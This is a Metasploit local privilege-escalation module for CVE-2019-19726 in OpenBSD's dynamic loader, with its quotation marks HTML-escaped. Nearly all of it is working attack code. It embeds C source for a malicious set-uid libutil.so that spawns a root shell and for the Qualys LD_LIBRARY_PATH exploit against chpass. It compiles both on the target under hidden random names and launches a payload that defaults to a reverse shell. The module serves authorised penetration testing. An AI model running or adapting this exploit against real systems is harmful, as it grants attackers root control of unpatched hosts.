# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;OpenBSD Dynamic Loader chpass Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the OpenBSD `ld.so`
        dynamic loader (CVE-2019-19726).

        The `_dl_getenv()` function fails to reset the `LD_LIBRARY_PATH`
        environment variable when set with approximately `ARG_MAX` colons.

        This can be abused to load `libutil.so` from an untrusted path,
        using `LD_LIBRARY_PATH` in combination with the `chpass` set-uid
        executable, resulting in privileged code execution.

        This module has been tested successfully on:

        OpenBSD 6.1 (amd64); and
        OpenBSD 6.6 (amd64)
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Qualys&#039;, # Discovery and exploit
          &#039;bcoles&#039;  # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2019-12-11&#039;,
      &#039;Platform&#039;       => %w[bsd unix], # OpenBSD
      &#039;Arch&#039;           => [ARCH_CMD],
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-19726&#039;],
          [&#039;EDB&#039;, &#039;47780&#039;],
          [&#039;URL&#039;, &#039;https://blog.qualys.com/laws-of-vulnerabilities/2019/12/11/openbsd-local-privilege-escalation-vulnerability-cve-2019-19726&#039;],
          [&#039;URL&#039;, &#039;https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt&#039;],
          [&#039;URL&#039;, &#039;https://www.openwall.com/lists/oss-security/2019/12/11/9&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19726/openbsd-dynamic-loader-chpass&#039;],
          [&#039;URL&#039;, &#039;https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/013_ldso.patch.sig&#039;]
        ],
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PAYLOAD&#039;    => &#039;cmd/unix/reverse&#039;,
          &#039;WfsDelay&#039;   => 10
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptString.new(&#039;CHPASS_PATH&#039;, [true, &#039;Path to chpass&#039;, &#039;/usr/bin/chpass&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def chpass_path
    datastore[&#039;CHPASS_PATH&#039;]
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def is_root?
    (cmd_exec(&#039;id -u&#039;).to_s.gsub(/[^\d]/, &#039;&#039;) == &#039;0&#039;)
  end

  def libutil_name
    return unless command_exists? &#039;readelf&#039;
    cmd_exec(&#039;readelf -a /usr/sbin/pwd_mkdb&#039;).to_s.scan(/\[(libutil\.so\.[\d\.]+)\]/).flatten.first
  end

  def check
    patches = cmd_exec(&#039;syspatch -l&#039;).to_s
    patch = &#039;013_ldso&#039;
    if patches.include? patch
      vprint_error "Patch #{patch} has been installed. Target is not vulnerable."
      return CheckCode::Safe
    end

    unless command_exists? &#039;cc&#039;
      vprint_error &#039;cc is not installed&#039;
      return CheckCode::Safe
    end
    print_good &#039;cc is installed&#039;

    CheckCode::Detected
  end

  def exploit
    unless check == CheckCode::Detected
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Qualys set-uid shared object from https://www.openwall.com/lists/oss-security/2019/12/11/9
    lib_data = <<-EOF
#include <paths.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    if (setuid(0) != 0) _exit(__LINE__);
    if (setgid(0) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

    libs = []
    lib = libutil_name
    if lib
      libs << lib
      print_good "Found libutil.so name: #{lib}"
    else
      libs << &#039;libutil.so.12.1&#039;
      libs << &#039;libutil.so.13.1&#039;
      print_warning "Could not determine libutil.so name. Using: #{libs.join(&#039;, &#039;)}"
    end

    lib_src_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}.c"
    upload lib_src_path, lib_data
    libs.each do |lib_name|
      lib_path = "#{base_dir}/#{lib_name}"
      print_status "Compiling #{lib_path} ..."
      output = cmd_exec "cc -fpic -shared -s -o #{lib_path} #{lib_src_path} -Wall"
      register_file_for_cleanup lib_path

      unless output.blank?
        print_error output
        fail_with Failure::Unknown, "#{lib_path}.c failed to compile"
      end
    end

    # Qualys exploit from https://www.openwall.com/lists/oss-security/2019/12/11/9
    exploit_data = <<-EOF
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <unistd.h>

int
main(int argc, char * const * argv)
{
    #define LLP "LD_LIBRARY_PATH=."
    static char llp[ARG_MAX - 128];
    memset(llp, &#039;:&#039;, sizeof(llp)-1);
    memcpy(llp, LLP, sizeof(LLP)-1);
    char * const envp[] = { llp, "EDITOR=echo &#039;#&#039; >>", NULL };

    #define DATA (ARG_MAX * sizeof(char *))
    const struct rlimit data = { DATA, DATA };
    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);

    if (argc <= 1) _exit(__LINE__);
    argv += 1;
    execve(argv[0], argv, envp);
    _exit(__LINE__);
}
EOF

    exploit_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload "#{exploit_path}.c", exploit_data
    print_status "Compiling #{exploit_path} ..."
    output = cmd_exec "cc -s #{exploit_path}.c -o #{exploit_path} -Wall"
    register_file_for_cleanup exploit_path

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{exploit_path}.c failed to compile"
    end

    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload payload_path, "#!/bin/sh\n#{payload.encoded}\n"
    chmod payload_path

    print_status &#039;Launching exploit...&#039;
    output = cmd_exec("cd #{base_dir};echo &#039;#{payload_path}&exit&#039;|#{exploit_path} #{chpass_path}")
    output.each_line { |line| vprint_status line.chomp }
  end
end

